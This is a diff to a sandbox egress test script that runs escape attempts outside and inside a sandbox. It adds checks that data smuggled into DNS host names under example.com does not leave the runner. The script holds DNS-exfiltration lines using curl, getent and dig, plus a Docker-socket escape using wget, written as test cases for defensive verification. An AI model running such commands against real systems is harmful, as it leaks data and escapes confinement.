@@ -4,6 +4,10 @@
 #   attempts.sh outside <label-prefix> <results-file>
 #   attempts.sh inside  <label-prefix> <record-prefix> <results-file> <real-workspace>
 #
+# (The record prefix labelled the DNS attempts that 2c.2 recorded without
+# asserting; since slice 2c.4 they are asserted under the label prefix, and
+# the record prefix is kept only so the command line does not change.)
+#
 # The same attempts run twice: first outside the sandbox, where each must get
 # out (the control), then inside it, where each must not. This script's own
 # exit statuses are not evidence. The judge (judge.py) reads a packet capture
@@ -139,10 +143,14 @@ else
 fi
 try docker-socket       docker run --rm --network host busybox:1.37 wget -q -T $T -O /dev/null http://208.67.222.222/
 
+# --- must block: data in a host name (slice 2c.4) ----------------------------
+# The name holds the label; a DNS query for it leaving the runner would carry it.
+try dns-via-proxy       curl -sS --max-time $T -o /dev/null "https://$prefix-viaproxy.example.com/"
+try dns-via-proxy-http  curl -sS --max-time $T -o /dev/null "http://$prefix-plainproxy.example.com/"
+try dns-default-getent  getent ahosts "$prefix-getent.example.com"
+try dns-default-dig     dig +time=3 +tries=1 "$prefix-digdefault.example.com" A
+
 # --- recorded, not asserted --------------------------------------------------
-try dns-default-getent  getent ahosts "$record_prefix-getent.example.com"
-try dns-default-dig     dig +time=3 +tries=1 "$record_prefix-dig.example.com" A
-try dns-via-proxy       curl -sS --max-time $T -o /dev/null "https://$record_prefix-proxy.example.com/"
 code=$(curl -sS --max-time $T -o /dev/null -w '%{http_code}' -H 'Host: example.org' https://api.github.com/ 2>/dev/null)
 note "RESULT host-mismatch $? $code"
 
